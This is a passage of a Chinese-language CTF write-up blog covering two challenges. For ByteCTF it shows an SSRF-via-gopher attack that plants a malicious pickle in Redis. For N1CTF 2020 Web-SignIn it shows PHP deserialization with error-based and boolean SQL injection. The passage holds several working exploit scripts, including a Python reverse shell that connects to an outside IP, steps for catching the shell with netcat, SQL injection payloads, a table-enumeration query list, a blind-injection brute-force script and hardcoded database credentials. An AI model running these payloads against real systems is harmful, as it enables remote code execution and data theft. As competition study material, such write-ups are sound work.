class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pipelines.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line">    <span class="comment"># 连接数据库</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 获取数据库连接信息</span></span><br><span class="line">        MONGODB_HOST = <span class="string">&#x27;172.20.0.8&#x27;</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_USER = <span class="string">&#x27;N0rth3&#x27;</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(</span><br><span class="line">            <span class="string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(</span><br><span class="line">            MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"><span class="comment"># 处理item</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line"><span class="comment"># 使用dict转换item，然后插入数据库</span></span><br><span class="line">    quote_info = dict(item)</span><br><span class="line">    print(quote_info)</span><br><span class="line">    self.table.insert(quote_info)</span><br><span class="line">    <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>bytectf/<strong>init</strong>.py：空</li></ol><p>爬虫源码非常简单，全部文件读出来还会发现内网有一台 mongodb 其实为了防止大家跑偏这台 mongodb 特意加了密码，简单想一下就会发现并没有什么能利用的（原因：redis 机器的 ip 不是 localhost，所以拿到 shell 也没用），然后我们继续分析爬虫的源码（不是很能理解）。也就是其中的这段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># byte.py 片段</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        <span class="comment"># 主键，原始 url</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>, url):</span><br><span class="line">                r = scrapy.Request(url, callback=self.parse2, dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list) &gt; <span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到是用 scrapy_redis 写的一个爬虫，功能即接收url，抓取其中的 url 链接然后爬取。</p><h2 id="Python反序列化"><a href="#Python反序列化" class="headerlink" title="Python反序列化"></a>Python反序列化</h2><p>文件基本读取完成，整理一下已知信息：（分析数据流，然后分析数据流中间危险函数）</p><ol><li>web 应用将任务传给redis，redis做为 broker（dumps）</li><li>爬虫从这个 broker 处获取任务，最后将任务的结果存入 mongodb，最基础的一套分布式应用架构（loads）。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/AB748B08-5068-48EF-B8EC-536FEB650AAC.png"><br>pickle 函数！！！Python 反序列化漏洞，目前可以确定漏洞类型为 Python 反序列化。</li></ol><p>题解的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># exp1.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;120.55.50.65&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将其中的 vps 地址和端口改为自己的，在自己的服务器运行 nc -lvvp 9999，将生成的 payload 在 <a href="http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html">http://101.200.50.18:30010/result?url=http://120.55.50.65/1.html</a> 的 url= 之后，即可 get shell。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/F195950B-B1C3-4F53-AEC0-E9502B8ED0AC.png"><br>最后得到 flag 为 ByteCTF{59c9c566-1167-4f66-950e-043fe53a1db5}</p><h2 id="拆解exp"><a href="#拆解exp" class="headerlink" title="拆解exp"></a>拆解exp</h2><p>exp 中知识盲区太多。可以考虑整理过后基础补充吧（Nnn 大佬还提供一种思路——打 redis），整理后的 exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># exp2.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            python -c  &#x27;import socket,subprocess,os;</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">                        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span></span><br><span class="line"><span class="string">                        s.connect((&quot;120.55.50.65&quot;,9999));</span></span><br><span class="line"><span class="string">                        os.dup2(s.fileno(),0);</span></span><br><span class="line"><span class="string">                        os.dup2(s.fileno(),1);</span></span><br><span class="line"><span class="string">                        os.dup2(s.fileno(),2);</span></span><br><span class="line"><span class="string">                        p=subprocess.call(</span></span><br><span class="line"><span class="string">                                            [&quot;/bin/sh&quot;,&quot;-i&quot;]</span></span><br><span class="line"><span class="string">                                          );</span></span><br><span class="line"><span class="string">                        &#x27;</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就一点点分析这个 exp，然后自己尝试些 exp。</p><h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><p>我将那段 <code>__reduce__</code>中的代码在本地进行执行，测试 bash 命令的正确性。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/DF0CABC7-4537-44C8-8289-28A1F9C990A2.png"><br>从上图可以看出，经过整理后的 bash 命令不能执行，也就印证了 exp2 生成的 payload 无法反弹 shell。</p><p>在这里补了一下 Python 反弹 shell 的姿势。尝试使用自己的反弹 shell 脚本 反弹 shell。Python 反弹 shell 的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;120.55.50.65&quot;</span>, <span class="number">9999</span>))</span><br><span class="line">os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">p = subprocess.call(</span><br><span class="line">    [<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-i&quot;</span>]</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 <a href="http://www.onelinerizer.com/">one-lined python 官网</a>生成一行的 python，并合成成命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python -c &quot;(lambda __g: [[[[(s.connect((&#39;120.55.50.65&#39;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#39;p&#39;] in [(subprocess.call([&#39;&#x2F;bin&#x2F;sh&#39;, &#39;-i&#39;]))]][0])[1])[1])[1])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0])(globals())&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将替换原 exp 中的 反弹 shell 脚本，得到脚本：（注意引号问题）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c \&quot;(lambda __g: [[[[(s.connect((&#x27;120.55.50.65&#x27;, 9999)), (os.dup2(s.fileno(), 0), (os.dup2(s.fileno(), 1), (os.dup2(s.fileno(), 2), [None for __g[&#x27;p&#x27;] in [(subprocess.call([&#x27;/bin/sh&#x27;, &#x27;-i&#x27;]))]][0])[1])[1])[1])[1] for __g[&#x27;s&#x27;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#x27;os&#x27;] in [(__import__(&#x27;os&#x27;, __g, __g))]][0] for __g[&#x27;subprocess&#x27;] in [(__import__(&#x27;subprocess&#x27;, __g, __g))]][0] for __g[&#x27;socket&#x27;] in [(__import__(&#x27;socket&#x27;, __g, __g))]][0])(globals())\&quot;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p>最后需要看懂 poc 的 前半部分，就是下面这一小块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gopher:&#x2F;&#x2F;172.20.0.7:6379&#x2F;_ZADD byte:requests 0 &quot;“</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在此之前先去补充了一下 gopher 和 redis 的基本用法。并且题解中提到通过观察源码可以知道 scrapy_redis 它会将request对象存入爬虫名:requests这样的有序列表中。这里我有 2 个问题：</p><ol><li>使用 gopher 协议可以向 redis 插入数据？可以在本地进行测试。</li><li>为什么在 result= 之后可以 SSRF？怎么进行测试？<br>使用下面的 url 在本地进行测试，确实可以获取到数据。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 插入键和值</span><br><span class="line">curl -v gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_set%20runoobkey%20redis</span><br><span class="line"># 获取值</span><br><span class="line">curl -v gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_get%20runoobkey</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>通过前面读取源码，可以知道 host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">127.0.0.1     localhost</span><br><span class="line">::1           localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0       ip6-localnet</span><br><span class="line">ff00::0       ip6-mcastprefix</span><br><span class="line">ff02::1       ip6-allnodes</span><br><span class="line">ff02::2       ip6-allrouters</span><br><span class="line">172.20.0.5    914c062c7588</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整理一下所有 ip 的思路（只看后缀）</p><ol><li>setting.py 中有一个 .7 的 ip</li><li>pipelines.py 中有一个 .8 的 ip</li><li>host 中有 .5 的 ip<br>每个 ip 都对应一个 redis，参考这篇文章 <a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a> 可知，存在主从 redis。如何判断 主服务器的地址呢？为啥开始 exp 打 .7 的 ip 呢？</li></ol><p>这个题目已经补完了！最重要的思想已经 GET，每次补题都会补题时间过长。。导致很多题目没补完，这次也是。(还有可能是比较菜的原因-。-#)</p><hr><p>官方已经将环境关闭了，额，补不完了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020年10月N1CTF部分web题解</title>
      <link href="276016d77f60/"/>
      <url>276016d77f60/</url>
      
        <content type="html"><![CDATA[<p>题解地址：<a href="https://github.com/Nu1LCTF/n1ctf-2020">https://github.com/Nu1LCTF/n1ctf-2020</a><br>国内比较好的比赛，将题目都放出来了，正好可以抽时间把「西湖论剑」的题目好好补补。</p><hr><a id="more"></a><h1 id="Web-SignIn（SQL盲注-报错注入-布尔注入）"><a href="#Web-SignIn（SQL盲注-报错注入-布尔注入）" class="headerlink" title="Web-SignIn（SQL盲注+报错注入+布尔注入）"></a>Web-SignIn（SQL盲注+报错注入+布尔注入）</h1><p>思路历程大致是这样的，比赛后没环境（</p><ul><li>理解反序列化执行流程。</li><li>反序列化执行 toString 函数。（绕过 wakeup，利用 destuct 的 echo 函数）<ul><li>安装 php5.5</li><li>本地绕过</li><li>云端绕过（没有回显）</li></ul></li><li>利用 stristr 函数调用 toString 函数。<ul><li>时间盲注（时间函数被 WAF 了）</li><li>SQL注入之基于运行错误的Boolean注入<ul><li>语法错误和正常执行 noip</li><li>特殊错误 welcome（含数据库名或后面的函数报错）<ul><li>‘+(select updatexml(1,concat(0x7e,(select database()),0x7e),1))+’</li><li>‘+(select _(1))+’<br>MySQL</li><li>exp(~(select * from (select n1ctf_websign())a))</li></ul></li></ul></li></ul></li><li>构造 XFF 进行 SQL 注入。</li><li>编写 exp 进行报错<br>payload：’+(select (database()&gt;1) and exp(~(select * from (select user())n1ctf_websign)))+’<br>利用 and 的特性进行判断。</li><li>最后从 n1key 中读出 flag。<ul><li>注意字段为 key 时需要使用别名。（与MySQL字段冲突）</li></ul></li></ul><p>反序列化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">O:4:&quot;flag&quot;:2:&#123;s:2:&quot;ip&quot;;O:2:&quot;ip&quot;:1:&#123;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;&#125;s:5:&quot;check&quot;;s:6:&quot;thrmen&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>时间盲注 SQL 语句：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png"></p><p>被 ban 的函数：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D65E9F75-E63F-46BE-9B5A-120238A16663.png"></p><p>用到的SQL语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 查询数据库名字</span><br><span class="line"># database()</span><br><span class="line"></span><br><span class="line"># 查询数据库信息</span><br><span class="line"># SELECT concat(version(),0x3a,user(),0x3a,database(),0x3a,@@datadir,0x3a,@@version_compile_os)</span><br><span class="line"></span><br><span class="line"># 查询文件读取权限</span><br><span class="line"># select group_concat(user,0x3a,file_priv) from mysql.user</span><br><span class="line"></span><br><span class="line"># 查询当前用户</span><br><span class="line"># select user()</span><br><span class="line"></span><br><span class="line"># 查询数据库版本</span><br><span class="line"># version()</span><br><span class="line"></span><br><span class="line"># 查询表名的长度</span><br><span class="line">#  (select length(table_name) from information_schema.tables where table_schema&#x3D;&#39;n1ctf_websign&#39; limit 0,1) &lt; 0</span><br><span class="line"></span><br><span class="line"># 查询表名（修改后面的 limit）</span><br><span class="line"># select table_name from information_schema.tables where table_schema&#x3D;DATABASE() limit 1,1</span><br><span class="line"></span><br><span class="line"># 判断字段名（修改后面的 limit）</span><br><span class="line"># select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;n1key&#39; limit 0,1。</span><br><span class="line"></span><br><span class="line"># 查询 ip 表。（边插入边查询，需要使用别名）</span><br><span class="line"># SELECT tid FROM (select ip tid from n1ip limit 0,1) AS tt</span><br><span class="line"></span><br><span class="line"># 查询某个字段的数据（key 与数据库的关键词相冲突，需要使用别名）</span><br><span class="line"># select GROUP_CONCAT(id) FROM n1key</span><br><span class="line"># select group_concat(bb.key) from n1key bb</span><br><span class="line"># select group_concat(key) FROM (SELECT * FROM n1key) as a</span><br><span class="line"># select id from n1key limit 0,1</span><br><span class="line"># 不使用字段名度值</span><br><span class="line"># SELECT a.2 FROM (SELECT 1, 2 UNION SELECT * FROM n1key</span><br><span class="line"></span><br><span class="line"># 判断是否有数据</span><br><span class="line"># SELECT (SELECT key FROM n1key) IS NULL</span><br><span class="line"></span><br><span class="line"># 查询文件</span><br><span class="line"># SELECT LOAD_FILE(&#39;&#x2F;flag&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>爆破使用的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;s:5:%22check%22;N;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成库名表名字符所在的字符列表字典</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii_str</span>():</span></span><br><span class="line">    str_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">127</span>):  <span class="comment"># 所有可显示字符</span></span><br><span class="line">        str_list.append(chr(i))</span><br><span class="line">    <span class="comment"># print(&#x27;可显示字符：%s&#x27;%str_list)</span></span><br><span class="line">    <span class="comment"># # 返回字符列表</span></span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">sql</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;1&#x27;+(select (&quot;</span> + sql + <span class="string">&quot;) and exp(~(select * from (select user())n1ctf_websign)))+&#x27;&quot;</span></span><br><span class="line">    print(payload)</span><br><span class="line">    resp = session.get(</span><br><span class="line">        url=url,</span><br><span class="line">        headers=&#123;<span class="string">&quot;x-forwarded-for&quot;</span>: payload&#125;</span><br><span class="line">    )</span><br><span class="line">    soup = BeautifulSoup(markup=resp.text, features=<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取判读 True 和 False 的依据</span></span><br><span class="line">    result = soup.find_all(name=<span class="string">&#x27;code&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行成功返回 True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n1ctf2020&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于测试函数是否正常执行（使用 while 不方便）</span></span><br><span class="line"><span class="comment"># param = f&quot;substr(database(), 1, 1)=&#x27;n&#x27;&quot;</span></span><br><span class="line"><span class="comment"># result = query(param)</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不同的字典</span></span><br><span 